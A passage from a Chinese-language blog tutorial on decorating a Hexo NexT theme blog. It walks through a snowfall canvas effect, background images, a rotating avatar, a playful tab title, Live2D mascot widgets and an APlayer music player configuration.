class="hljs-title function_">random</span>() * width);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxSize</span> + <span class="hljs-number">2</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">fallSpeed</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = <span class="hljs-number">0</span>;<br>&#125;;<br><span class="hljs-comment">// 渲染雪花-随机形状（此处可修改雪花颜色！！！）</span><br>flakeMove.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">ctx</span>) &#123;<br>    <span class="hljs-keyword">var</span> snowFlake = ctx.<span class="hljs-title function_">createRadialGradient</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>);<br>    snowFlake.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;rgba(255, 255, 255, 0.9)&quot;</span>);  <span class="hljs-comment">/* 此处是雪花颜色，默认是白色 */</span><br>    snowFlake.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">.5</span>, <span class="hljs-string">&quot;rgba(255, 255, 255, 0.5)&quot;</span>); <span class="hljs-comment">/* 若要改为其他颜色，请自行查 */</span><br>    snowFlake.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rgba(255, 255, 255, 0)&quot;</span>);    <span class="hljs-comment">/* 找16进制的RGB 颜色代码。 */</span><br>    ctx.<span class="hljs-title function_">save</span>();<br>    ctx.<span class="hljs-property">fillStyle</span> = snowFlake;<br>    ctx.<span class="hljs-title function_">beginPath</span>();<br>    ctx.<span class="hljs-title function_">arc</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-number">2</span>);<br>    ctx.<span class="hljs-title function_">fill</span>();<br>    ctx.<span class="hljs-title function_">restore</span>();<br>&#125;;<br><span class="hljs-comment">/* 创建雪花-定义形状 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createFlakes</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> maxFlake = <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxFlake</span>,<br>        flakes = <span class="hljs-variable language_">this</span>.<span class="hljs-property">flakes</span> = [],<br>        canvas = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; maxFlake; i++) &#123;<br>        flakes.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">flakeMove</span>(canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">flakeSize</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">fallSpeed</span>))<br>    &#125;<br>&#125;<br><span class="hljs-comment">/* 画雪 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">drawSnow</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> maxFlake = <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxFlake</span>,<br>        flakes = <span class="hljs-variable language_">this</span>.<span class="hljs-property">flakes</span>;<br>    ctx = <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>, canvas = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>, that = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-comment">/* 清空雪花 */</span><br>    ctx.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> e = <span class="hljs-number">0</span>; e &lt; maxFlake; e++) &#123;<br>        flakes[e].<span class="hljs-title function_">update</span>();<br>        flakes[e].<span class="hljs-title function_">render</span>(ctx);<br>    &#125;<br>    <span class="hljs-comment">/*  一帧一帧的画 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">loop</span> = <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        drawSnow.<span class="hljs-title function_">apply</span>(that);<br>    &#125;);<br>&#125;<br><span class="hljs-comment">/* 调用及控制方法 */</span><br><span class="hljs-keyword">var</span> snow = <span class="hljs-keyword">new</span> <span class="hljs-title function_">snowFall</span>(&#123;<span class="hljs-attr">maxFlake</span>:<span class="hljs-number">60</span>&#125;);<br>snow.<span class="hljs-title function_">start</span>();<br></code></pre></td></tr></table></figure><p>然后在_layout.swig的末尾添加代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 雪花特效 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;\js\snow.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="三、更改背景图片（普通设置-自动更换壁纸）"><a href="#三、更改背景图片（普通设置-自动更换壁纸）" class="headerlink" title="三、更改背景图片（普通设置+自动更换壁纸）"></a>三、更改背景图片（普通设置+自动更换壁纸）</h1><p>如果只是普通的白色背景看着挺单调的，所以也可以选择更改下背景的图片。</p><p>在<strong>\themes\next\source\css_custom\custom.styl</strong>添加以下代码。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br>    <span class="hljs-attribute">background</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">/images/bg.jpg</span>);<br>    <span class="hljs-attribute">background-size</span>:cover;<br>    <span class="hljs-attribute">background-repeat</span>:no-repeat;<br>    <span class="hljs-attribute">background-attachment</span>:fixed;<br>    <span class="hljs-attribute">background-position</span>:center;<br>&#125;<br></code></pre></td></tr></table></figure><p>图片路径<strong>\themes\next\source\images\bg.jpg</strong></p><p>也可以选择<strong>自动更换背景</strong>。</p><p>在<strong>\themes\next\source\css_custom\custom.styl</strong>添加以下代码。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs css">// Custom styles.<br>// 添加背景图片<br><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://source.unsplash.com/random/1600x900?wallpapers</span>);<br>  <span class="hljs-attribute">background-size</span>: cover;<br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>  <span class="hljs-attribute">background-attachment</span>: fixed;<br>  <span class="hljs-attribute">background-position</span>: <span class="hljs-number">50%</span> <span class="hljs-number">50%</span>;<br>&#125;<br><br>// 修改主体透明度<br><span class="hljs-selector-class">.main-inner</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.8</span>;<br>&#125;<br><br>// 修改菜单栏透明度<br><span class="hljs-selector-class">.header-inner</span> &#123;<br>  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>图片的来源是：<a href="https://source.unsplash.com/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E7%9A%84%E6%83%B3%E6%B3%95%E8%AE%BE%E5%AE%9A%E6%9B%B4%E6%8D%A2%E6%AC%A1%E6%95%B0%E5%92%8C%E8%83%8C%E6%99%AF%E9%A3%8E%E6%A0%BC%E3%80%82">https://source.unsplash.com/，可以根据自己的想法设定更换次数和背景风格。</a></p><h1 id="四、旋转头像"><a href="#四、旋转头像" class="headerlink" title="四、旋转头像"></a>四、旋转头像</h1><p><img src="https://i.loli.net/2019/08/17/GJLNzyProEsvB5g.gif" alt="1111.gif"></p><p>修改**&#x2F;themes&#x2F;next&#x2F;source&#x2F;css&#x2F;_common&#x2F;components&#x2F;sidebar&#x2F;sidebar-author.styl**文件为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.site-author-image</span> &#123;<br>  <span class="hljs-attribute">display</span>: block;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>  <span class="hljs-attribute">padding</span>: $site-author-image-padding;<br>  <span class="hljs-attribute">max-width</span>: $site-author-image-width;<br>  <span class="hljs-attribute">height</span>: $site-author-image-height;<br>  <span class="hljs-attribute">border</span>: $site-author-image-border-width solid $site-author-image-border-color;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">60%</span>;<br>  <span class="hljs-attribute">transition</span>: <span class="hljs-number">2.5s</span> all;  <br>&#125;<br><br><span class="hljs-selector-class">.site-author-image</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">360deg</span>);<br>&#125;<br><br><br><span class="hljs-selector-class">.site-author-name</span> &#123;<br>  <span class="hljs-attribute">margin</span>: $site-author-name-margin;<br>  <span class="hljs-attribute">text-align</span>: $site-author-name-align;<br>  <span class="hljs-attribute">color</span>: $site-author-name-color;<br>  <span class="hljs-attribute">font-weight</span>: $site-author-name-weight;<br>&#125;<br><br><span class="hljs-selector-class">.site-description</span> &#123;<br>  <span class="hljs-attribute">margin-top</span>: $site-description-margin-top;<br>  <span class="hljs-attribute">text-align</span>: $site-description-align;<br>  <span class="hljs-attribute">font-size</span>: $site-description-font-size;<br>  <span class="hljs-attribute">color</span>: $site-description-color;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="五、Funny标题栏w"><a href="#五、Funny标题栏w" class="headerlink" title="五、Funny标题栏w"></a>五、Funny标题栏w</h1><p>很有趣的一个美化，当你浏览其他网页时，标题栏的文字会变更，当你回到页面，又会再次变更（还记得之前逛一个博客，只要离开页面就会显示【高清美女照片】，吓得我还以为开了个什么网站）。</p><p><img src="https://i.loli.net/2019/08/17/mTbwHJlXfEak6KU.gif" alt="2222.gif"></p><p>在<strong>\themes\next\source\js</strong>文件下创建一个<strong>FunnyTitle.js</strong>文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!--浏览器搞笑标题--&gt;<br> <span class="hljs-keyword">var</span> <span class="hljs-title class_">OriginTitle</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span>;<br> <span class="hljs-keyword">var</span> titleTime;<br> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;visibilitychange&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">hidden</span>) &#123;<br>         $(<span class="hljs-string">&#x27;[rel=&quot;icon&quot;]&#x27;</span>).<span class="hljs-title function_">attr</span>(<span class="hljs-string">&#x27;href&#x27;</span>, <span class="hljs-string">&quot;/img/trhx2.png&quot;</span>);<br>         <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;警告！警告！&#x27;</span>;<br>         <span class="hljs-built_in">clearTimeout</span>(titleTime);<br>     &#125;<br>     <span class="hljs-keyword">else</span> &#123;<br>         $(<span class="hljs-string">&#x27;[rel=&quot;icon&quot;]&#x27;</span>).<span class="hljs-title function_">attr</span>(<span class="hljs-string">&#x27;href&#x27;</span>, <span class="hljs-string">&quot;/img/trhx2.png&quot;</span>);<br>         <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;ヾ(◍°∇°◍)欢迎回来|&#x27;</span> + <span class="hljs-title class_">OriginTitle</span>;<br>         titleTime = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>             <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-title class_">OriginTitle</span>;<br>         &#125;, <span class="hljs-number">2000</span>);<br>     &#125;<br> &#125;);<br></code></pre></td></tr></table></figure><p>然后在**_layout.swig**的末尾添加代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--浏览器搞笑标题--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/FunnyTitle.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="六、添加live2d看板娘"><a href="#六、添加live2d看板娘" class="headerlink" title="六、添加live2d看板娘"></a>六、添加live2d看板娘</h1><p>live2d是这几年比较火热的一门技术，是应用于游戏中的一种绘图渲染，近几年广泛应用于手游中（作为看板）。很意外的，它也很适用于博客中。</p><p>虽然本身的功能不大，但是作为美化来说还是十分可爱的。</p><p>虽然有朋友在研究这项技术，但由于我本身的画图技术不强，对于live2d的制作就不讲了，只说如何放上一个live2d。</p><h2 id="1-简易版"><a href="#1-简易版" class="headerlink" title="1.简易版"></a>1.简易版</h2><p>如果对于看板娘的要求不是特别高，只是需要放在那里卖个萌就行，建议用简易版的就ok。</p><p><strong>安装插件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install --save hexo-helper-live2d<br></code></pre></td></tr></table></figure><p><strong>安装模型</strong>（模型的样式可以参考<a href="https://huaji8.top/post/live2d-plugin-2.0/">这里</a>，把packagename的名字换成自己喜欢的模型名即可）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install packagename<br></code></pre></td></tr></table></figure><p>当然你也可以用自己制作的模型和网上下载的，一些详细的设置可以参考<a href="https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md">作者文档</a>。</p><h2 id="2-中级版"><a href="#2-中级版" class="headerlink" title="2.中级版"></a>2.中级版</h2><p>比起简易版添加了对话框功能。</p><p>长这样（↓）</p><p><img src="https://i.loli.net/2019/08/08/4hlWGRbJx1yZDrL.jpg" alt="1.jpg"></p><p>首先下载大佬的<a href="https://github.com/galnetwen/Live2D">github代码</a>，把下载下来的文件更名为live2d，然后放到themes\next\source文件里。</p><p>打开\themes\next\layout下的_layout.swig，在<strong>body</strong>标签内添加：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/live2d/css/live2d.css&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;landlord&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;opacity:0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;live2d&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;280&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;250&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;live2d&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hide-button&quot;</span>&gt;</span>隐藏<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> message_Path = <span class="hljs-string">&#x27;/live2d/&#x27;</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> home_Path = <span class="hljs-string">&#x27;https://soyawww.github.io/&#x27;</span>  <span class="hljs-comment">//此处修改为你的域名</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/live2d/js/live2d.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/live2d/js/message.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title function_">loadlive2d</span>(<span class="hljs-string">&quot;live2d&quot;</span>, <span class="hljs-string">&quot;/live2d/model/tia/model.json&quot;</span>);  <span class="hljs-comment">//此处为你是用的模型文件，可以修改</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如要修改模型，修改上面代码的loadlive2d路径即可。</p><p>如要修改点击时看板娘或者鼠标放在某个元素上的对话，打开live2d文件中的message.json进行修改。</p><h2 id="3-高级版"><a href="#3-高级版" class="headerlink" title="3.高级版"></a>3.高级版</h2><p><img src="https://s2.ax1x.com/2019/08/17/mKSIy9.gif" alt="mKSIy9.gif"></p><p>拥有换装、换人、飞机大战小游戏等功能的看板娘（也就是我现在正在用的。）</p><p>首先下载大佬的<a href="https://github.com/stevenjoezhang/live2d-widget">github文件</a>，修改好名字放置于<strong>\themes\next\source</strong>下（当然你也可以选择直接fork仓库，如果你不想下载文件的话就直接跳过这一段吧）。</p><p>打开_layout.swig文件，先在<strong>head</strong>标签下添加依赖，否则无法正常显示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后再在<strong>footer</strong>标签下添加：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://soyawww.github.io/live2d/autoload.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>打开live2d文件下的<strong>autoloads.js</strong>文件，修改绝对路径：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> live2d_path = <span class="hljs-string">&quot;/live2d/&quot;</span>;<br></code></pre></td></tr></table></figure><p>其他的就按照自己的需求修改。</p><p>例如waifu.css修改看板的大小和位置，waifu-tips.json修改对话。</p><p><img src="https://i.loli.net/2019/08/08/EHhTntz1RZeaNSM.jpg" alt="screenshot.1.jpg"></p><p>总之，更多的内容就自己摸索吧！</p><p><strong>~关于fork仓库和api</strong></p><p>其实不用下下来文件也可以直接用，用法是添加在添加依赖后直接添加一行代码在<strong>footer</strong>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个是直接用的大佬的仓库，你可以选择把仓库fork下来，然后自行修改（如下）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/gh/username/live2d-widget/autoload.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>无论是用fork仓库的方法还是下载文件，都是无法改变模型的，如果想要<strong>改变模型</strong>，就需要自建api（详情参考<a href="https://github.com/fghrsh/live2d_api">这里</a>）。</p><h1 id="七、添加音乐插件aplayer"><a href="#七、添加音乐插件aplayer" class="headerlink" title="七、添加音乐插件aplayer"></a>七、添加音乐插件aplayer</h1><p>很简约可爱的一个音乐插件。</p><p><img src="https://i.loli.net/2019/08/08/kQM4uqGIgl9pSme.jpg" alt="screenshot.4.jpg"></p><p>先下载<a href="https://github.com/MoePlayer/APlayer">源码</a>，把解压后的disk文件放到<strong>\themes\next\source</strong>里。</p><p>然后在disk文件里新建music.js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">APlayer</span>(&#123;<br>    <span class="hljs-attr">container</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;aplayer&#x27;</span>), <span class="hljs-comment">//播放器容器元素</span><br>    <span class="hljs-attr">fixed</span>: <span class="hljs-literal">true</span>, <br>    <span class="hljs-attr">autoplay</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//自动播放</span><br>    <span class="hljs-comment">//theme: &#x27;#FADFA3&#x27;, //主题色</span><br>    <span class="hljs-attr">loop</span>: <span class="hljs-string">&#x27;all&#x27;</span>, <span class="hljs-comment">//音频循环播放, 可选值: &#x27;all&#x27;全部循环, &#x27;one&#x27;单曲循环, &#x27;none&#x27;不循环</span><br>    <span class="hljs-attr">order</span>: <span class="hljs-string">&#x27;list&#x27;</span>, <span class="hljs-comment">//音频循环顺序, 可选值: &#x27;list&#x27;列表循环, &#x27;random&#x27;随机循环</span><br>    <span class="hljs-attr">preload</span>: <span class="hljs-string">&#x27;auto&#x27;</span>, <span class="hljs-comment">//预加载，可选值: &#x27;none&#x27;, &#x27;metadata&#x27;, &#x27;auto&#x27;</span><br>    <span class="hljs-attr">volume</span>: <span class="hljs-number">0.7</span>, <span class="hljs-comment">//默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span><br>    <span class="hljs-attr">mutex</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">//互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器</span><br>    <span class="hljs-attr">listFolded</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//列表默认折叠</span><br>    <span class="hljs-attr">listMaxHeight</span>: <span class="hljs-number">90</span>, <span class="hljs-comment">//列表最大高度</span><br>    <span class="hljs-attr">lrcType</span>: <span class="hljs-number">3</span>, <span class="hljs-comment">//歌词传递方式</span><br>    <span class="hljs-attr">audio</span>: [ <span class="hljs-comment">//音频信息,包含以下</span><br>        &#123;<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;STAND-ALONE&#x27;</span>, <span class="hljs-comment">//音频名称</span><br>            <span class="hljs-attr">artist</span>: <span class="hljs-string">&#x27;Aimer&#x27;</span>, <span class="hljs-comment">//音频艺术家</span><br>            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/dist/music/STAND-ALONE.mp3&#x27;</span>, <span class="hljs-comment">//音频外链</span><br>            <span class="hljs-attr">cover</span>: <span class="hljs-string">&#x27;https://p1.music.126.net/ZzYO1LkLvRZVBoCnfsYAUA==/109951164050936507.jpg?param=177y177&#x27;</span>, <span class="hljs-comment">//音频封面</span><br>            <span class="hljs-attr">lrc</span>: <span class="hljs-string">&#x27;dist/music/STAND-ALONE.lrc&#x27;</span>, <span class="hljs-comment">//音频歌词，配合上面的lrcType使用</span><br>        &#125;, <br>        &#123;<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;This is the show&#x27;</span>, <span class="hljs-comment">//音频名称</span><br>            <span class="hljs-attr">artist</span>: <span class="hljs-string">&#x27;辻詩音&#x27;</span>, <span 